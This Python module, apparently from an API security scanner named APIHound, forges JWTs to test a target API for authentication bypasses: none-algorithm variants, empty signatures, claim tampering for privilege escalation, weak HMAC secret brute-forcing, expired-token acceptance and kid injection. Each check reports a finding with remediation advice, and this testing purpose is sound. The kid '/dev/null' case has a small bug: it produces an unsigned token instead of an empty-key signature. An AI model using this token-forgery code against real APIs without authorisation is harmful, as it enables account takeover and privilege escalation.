"""
APIHound — JWT Attack Module
none-algorithm, key confusion, claim tampering, weak secret brute-force, kid injection.
"""
import base64
import hashlib
import hmac
import json
import logging
from typing import List, Optional
from core.config import Finding, ScanConfig
from core.http_client import HTTPClient
from core.openapi_parser import APIEndpoint
from core.response_analysis import similarity
from payloads.payload_db import PayloadDB

logger = logging.getLogger("apihound.checks.jwt")


class JWTAttackCheck:
    CHECK_ID = "JWT"
    OWASP_REF = "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"

    def __init__(self, config: ScanConfig, client: HTTPClient):
        self.config = config
        self.client = client
        self.findings: List[Finding] = []

    def run(self, endpoints: List[APIEndpoint]) -> List[Finding]:
        logger.info(f"[{self.CHECK_ID}] Starting JWT attack checks")

        token = self._extract_jwt()
        if not token:
            logger.info(f"[{self.CHECK_ID}] No JWT token found in auth header — skipping.")
            return self.findings

        header, payload, signature = self._decode_jwt(token)
        if not header or not payload:
            return self.findings

        logger.info(f"[{self.CHECK_ID}] JWT algorithm: {header.get('alg', 'unknown')}")

        test_eps = self._protected_endpoints(endpoints[:10])
        if not test_eps:
            logger.info(f"[{self.CHECK_ID}] No endpoint proven to require the supplied JWT — active JWT bypass tests skipped.")
            # Passive token-quality checks below can still run.

        # Test 1: none algorithm
        self._test_none_alg(header, payload, test_eps)

        # Test 2: Empty signature
        self._test_empty_signature(token, test_eps)

        # Test 3: Claim tampering
        self._test_claim_tampering(header, payload, token, test_eps)

        # Test 4: Weak secret (HS256 brute-force)
        if header.get("alg", "").startswith("HS"):
            self._test_weak_secret(token, header, payload, test_eps)

        # Test 5: Expired token acceptance
        self._test_expired_token(header, payload, test_eps)

        # Test 6: kid injection
        if "kid" in header:
            self._test_kid_injection(header, payload, test_eps)

        logger.info(f"[{self.CHECK_ID}] Complete: {len(self.findings)} findings")
        return self.findings

    def _extract_jwt(self) -> Optional[str]:
        """Extract JWT from auth header."""
        auth = self.config.auth_header
        if not auth:
            return None
        token = auth.replace("Bearer ", "").replace("bearer ", "").strip()
        if token.count(".") == 2:
            return token
        return None

    def _decode_jwt(self, token: str):
        """Decode JWT header and payload (no signature verification)."""
        parts = token.split(".")
        if len(parts) != 3:
            return None, None, None
        try:
            header = json.loads(self._b64_decode(parts[0]))
            payload = json.loads(self._b64_decode(parts[1]))
            return header, payload, parts[2]
        except Exception as e:
            logger.debug(f"JWT decode error: {e}")
            return None, None, None

    def _b64_decode(self, data: str) -> bytes:
        """URL-safe base64 decode with padding."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    def _b64_encode(self, data: bytes) -> str:
        """URL-safe base64 encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _forge_token(self, header: dict, payload: dict, secret: str = "") -> str:
        """Build a JWT with specified header and payload."""
        h = self._b64_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64_encode(json.dumps(payload, separators=(",", ":")).encode())

        if header.get("alg", "").lower() == "none":
            return f"{h}.{p}."

        if header.get("alg") == "HS256" and secret:
            msg = f"{h}.{p}".encode()
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            return f"{h}.{p}.{self._b64_encode(sig)}"

        return f"{h}.{p}."

    def _protected_endpoints(self, endpoints: List[APIEndpoint]) -> List[APIEndpoint]:
        """Return endpoints where the supplied auth succeeds and unauthenticated access does not.

        This prevents public endpoints from being mistaken for JWT bypasses.
        """
        protected = []
        self._jwt_baselines = {}
        for ep in endpoints:
            auth_resp = self.client.request_endpoint(ep)
            if not auth_resp or auth_resp.status_code not in range(200, 300):
                continue
            unauth_resp = self.client.request_endpoint(ep, omit_auth=True)
            if unauth_resp is None:
                continue
            if unauth_resp.status_code in (401, 403) or unauth_resp.status_code not in range(200, 300):
                protected.append(ep)
                self._jwt_baselines[(ep.method, ep.path)] = auth_resp
        return protected

    def _test_token(self, token: str, endpoints: List[APIEndpoint]) -> Optional:
        """Test a forged token only against endpoints proven to require JWT auth."""
        headers = {"Authorization": f"Bearer {token}"}
        for ep in endpoints:
            resp = self.client.request_endpoint(ep, headers=headers)
            baseline = getattr(self, "_jwt_baselines", {}).get((ep.method, ep.path))
            if resp and baseline and resp.status_code in range(200, 300):
                # A bypass should look broadly like the authenticated response, not a
                # generic login/error page that happens to return HTTP 200.
                if similarity(resp, baseline) >= 0.65:
                    return ep, resp
        return None

    def _test_none_alg(self, header: dict, payload: dict, endpoints: list):
        """Test none algorithm bypass."""
        for none_alg in ["none", "None", "NONE", "nOnE"]:
            forged_header = {**header, "alg": none_alg}
            token = self._forge_token(forged_header, payload)
            result = self._test_token(token, endpoints)
            if result:
                ep, resp = result
                self.findings.append(Finding(
                    check_id="JWT-NONE",
                    severity="CRITICAL",
                    title="JWT none algorithm accepted",
                    description=f"API accepts JWT with alg:{none_alg}, bypassing signature verification.",
                    endpoint=ep.full_url,
                    method=ep.method,
                    evidence=f"Forged token with alg:{none_alg} accepted. Got 200 OK.",
                    response_code=200,
                    confidence="High",
                    remediation="Reject 'none' algorithm. Enforce algorithm allowlist server-side.",
                    references=[self.OWASP_REF],
                    cvss=9.8,
                    tags=["jwt", "none-algorithm"],
                ))
                return

    def _test_empty_signature(self, original_token: str, endpoints: list):
        """Test if empty/missing signature is accepted."""
        parts = original_token.split(".")
        truncated = f"{parts[0]}.{parts[1]}."
        result = self._test_token(truncated, endpoints)
        if result:
            ep, resp = result
            self.findings.append(Finding(
                check_id="JWT-NOSIG",
                severity="CRITICAL",
                title="JWT accepted without signature",
                description="API accepts JWT with empty signature, allowing arbitrary claim forgery.",
                endpoint=ep.full_url,
                method=ep.method,
                evidence="Token with empty signature field returned 200 OK.",
                response_code=200,
                confidence="High",
                remediation="Always verify JWT signatures. Reject tokens with missing/empty signatures.",
                references=[self.OWASP_REF],
                cvss=9.8,
                tags=["jwt", "no-signature"],
            ))

    def _test_claim_tampering(self, header: dict, payload: dict, original_token: str, endpoints: list):
        """Test privilege escalation via claim modification."""
        for claim, values in PayloadDB.JWT_ATTACKS["claim_tampering"].items():
            if claim not in payload:
                continue
            original_value = payload[claim]
            for new_value in values:
                if str(new_value) == str(original_value):
                    continue
                tampered = {**payload, claim: new_value}
                # Use none-alg to test (if none-alg doesn't work, this won't either — fine)
                token = self._forge_token({**header, "alg": "none"}, tampered)
                result = self._test_token(token, endpoints)
                if result:
                    ep, resp = result
                    self.findings.append(Finding(
                        check_id="JWT-TAMPER",
                        severity="HIGH",
                        title=f"JWT claim tampering — {claim}",
                        description=f"Changed '{claim}' from '{original_value}' to '{new_value}' was accepted.",
                        endpoint=ep.full_url,
                        method=ep.method,
                        evidence=f"Tampered claim {claim}={new_value} accepted.",
                        response_code=200,
                        confidence="High",
                        remediation="Validate all JWT claims server-side. Never trust client-supplied claims.",
                        references=[self.OWASP_REF],
                        cvss=8.2,
                        tags=["jwt", "claim-tampering", "privilege-escalation"],
                    ))
                    return

    def _test_weak_secret(self, original_token: str, header: dict, payload: dict, endpoints: list):
        """Brute-force weak HMAC secrets."""
        parts = original_token.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        for secret in PayloadDB.JWT_ATTACKS["weak_secrets"]:
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            computed_sig = self._b64_encode(sig)
            if computed_sig == original_sig:
                self.findings.append(Finding(
                    check_id="JWT-WEAK-SECRET",
                    severity="CRITICAL",
                    title="JWT signed with weak secret",
                    description=f"JWT HMAC secret cracked: '{secret}'. Attacker can forge arbitrary tokens.",
                    endpoint=self.config.target_url,
                    method="N/A",
                    evidence=f"Secret '{secret}' produces matching signature.",
                    confidence="High",
                    remediation="Use a strong, random secret (256+ bits). Rotate regularly.",
                    references=[self.OWASP_REF],
                    cvss=9.8,
                    tags=["jwt", "weak-secret"],
                ))
                return

    def _test_expired_token(self, header: dict, payload: dict, endpoints: list):
        """Test if expired tokens are still accepted."""
        if "exp" not in payload:
            self.findings.append(Finding(
                check_id="JWT-NOEXP",
                severity="MEDIUM",
                title="JWT has no expiration claim",
                description="Token does not contain an 'exp' claim, meaning it never expires.",
                endpoint=self.config.target_url,
                method="N/A",
                evidence=f"JWT claims: {list(payload.keys())} — no 'exp' field.",
                confidence="High",
                remediation="Always set JWT expiration. Use short-lived tokens with refresh mechanism.",
                references=[self.OWASP_REF],
                cvss=5.3,
                tags=["jwt", "no-expiration"],
            ))
            return

        # Set exp to the past
        expired_payload = {**payload, "exp": 1000000000}  # 2001-09-08
        token = self._forge_token({**header, "alg": "none"}, expired_payload)
        result = self._test_token(token, endpoints)
        if result:
            ep, resp = result
            self.findings.append(Finding(
                check_id="JWT-EXPIRED",
                severity="HIGH",
                title="Expired JWT accepted",
                description="API accepts JWT tokens with past expiration dates.",
                endpoint=ep.full_url,
                method=ep.method,
                evidence="Token with exp=2001-09-08 was accepted.",
                response_code=200,
                confidence="High",
                remediation="Validate 'exp' claim. Reject expired tokens.",
                references=[self.OWASP_REF],
                cvss=7.5,
                tags=["jwt", "expired-token"],
            ))

    def _test_kid_injection(self, header: dict, payload: dict, endpoints: list):
        """Test kid header parameter injection."""
        for kid_payload in PayloadDB.JWT_ATTACKS["kid_injection"][:3]:
            forged_header = {**header, "kid": kid_payload, "alg": "HS256"}
            # If kid points to /dev/null, secret is empty string
            secret = "" if "/dev/null" in kid_payload else "test"
            token = self._forge_token(forged_header, payload, secret)
            result = self._test_token(token, endpoints)
            if result:
                ep, resp = result
                self.findings.append(Finding(
                    check_id="JWT-KID",
                    severity="CRITICAL",
                    title=f"JWT kid injection — {kid_payload}",
                    description=f"JWT kid parameter injection with '{kid_payload}' was accepted.",
                    endpoint=ep.full_url,
                    method=ep.method,
                    evidence=f"kid={kid_payload} accepted.",
                    response_code=200,
                    confidence="High",
                    remediation="Sanitize kid parameter. Never use it in file paths or database queries.",
                    references=[self.OWASP_REF],
                    cvss=9.8,
                    tags=["jwt", "kid-injection"],
                ))
                return
